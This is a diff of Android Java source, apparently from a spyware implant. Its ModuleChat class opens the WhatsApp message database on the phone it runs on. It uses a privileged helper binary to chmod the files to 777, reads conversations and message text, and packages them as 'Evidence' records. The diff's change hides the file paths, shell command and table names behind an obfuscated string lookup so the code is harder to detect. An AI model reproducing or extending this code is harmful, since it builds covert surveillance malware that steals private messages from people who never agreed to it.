@@ -14,6 +14,7 @@ import android.database.sqlite.SQLiteOpenHelper;
 import android.database.sqlite.SQLiteQueryBuilder;
 import android.util.Pair;
 
+import com.android.networking.Messages;
 import com.android.networking.ProcessInfo;
 import com.android.networking.ProcessStatus;
 import com.android.networking.Status;
@@ -118,11 +119,14 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			Check.log(TAG + " (readChatMessages)");
 		}
 		boolean updateMarkup = false;
-		String dbDir = "/data/data/com.whatsapp/databases";
-		String dbFile = dbDir + "/msgstore.db";
+		// f.0=/data/data/com.whatsapp/databases
+		String dbDir = Messages.getString("f.0");
+		// f.1=/msgstore.db
+		String dbFile = dbDir + Messages.getString("f.1");
 		// changeFilePermission(dbFile,777);
-		Runtime.getRuntime().exec("/system/bin/ntpsvd pzm 777 " + dbDir);
-		Runtime.getRuntime().exec("/system/bin/ntpsvd pzm 777 " + dbFile);
+		// f.2=/system/bin/ntpsvd pzm 777 
+		Runtime.getRuntime().exec(Messages.getString("f.2") + dbDir);
+		Runtime.getRuntime().exec(Messages.getString("f.2") + dbFile);
 		File file = new File(dbFile);
 		if (file.canRead()) {
 			if (Cfg.DEBUG) {
@@ -177,15 +181,19 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		queryBuilderIndex.setTables("chat_list");
+		// f.3=chat_list
+		queryBuilderIndex.setTables(Messages.getString("f.3"));
 		// queryBuilder.appendWhere(inWhere);
-		String[] projection = { "_id", "key_remote_jid", "message_table_id" };
+		// f.4=_id
+		// f.5=key_remote_jid
+		// f.6=message_table_id
+		String[] projection = { Messages.getString("f.4"), Messages.getString("f.5"), Messages.getString("f.6") };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
 		// iterate conversation indexes
 		while (cursor != null && cursor.moveToNext()) {
-			String jid = cursor.getString(cursor.getColumnIndexOrThrow("key_remote_jid"));
-			int mid = cursor.getInt(cursor.getColumnIndexOrThrow("message_table_id"));
+			String jid = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f.5")));
+			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f.6")));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
 			}
@@ -216,15 +224,17 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
 		}
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		queryBuilderIndex.setTables("messages");
-		queryBuilderIndex.appendWhere("key_remote_jid = '" + conversation + "' AND _id > " + lastReadIndex);
-		String[] projection = { "_id", "key_remote_jid", "data" };
+		// f.a=messages
+		queryBuilderIndex.setTables(Messages.getString("f.a"));
+		queryBuilderIndex.appendWhere(Messages.getString("f.5")+" = '" + conversation + "' AND "+ Messages.getString("f.4") +" > " + lastReadIndex);
+		// f.7=data
+		String[] projection = { Messages.getString("f.4"), Messages.getString("f.5"), Messages.getString("f.7") };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 		ArrayList<String> messages = new ArrayList<String>();
 		int lastRead = lastReadIndex;
 		while (cursor != null && cursor.moveToNext()) {
-			String data = cursor.getString(cursor.getColumnIndexOrThrow("data"));
-			int index = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
+			String data = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f.7")));
+			int index = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f.4")));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data);
 			}
@@ -245,9 +255,11 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		for (String message : messages) {
 
 			items.add(datetime.getStructTm());
-			items.add(WChar.getBytes("whatsapp", true));
+			// f.8=whatsapp			
+			items.add(WChar.getBytes(Messages.getString("f.8"), true));
 			items.add(WChar.getBytes("", true));
-			items.add(WChar.getBytes(conversation.replaceAll("@s.whatsapp.net", ""), true));
+			// f.9=@s.whatsapp.net	
+			items.add(WChar.getBytes(conversation.replaceAll(Messages.getString("f.9"), ""), true));
 			items.add(WChar.getBytes(message, true));
 			items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
 		}
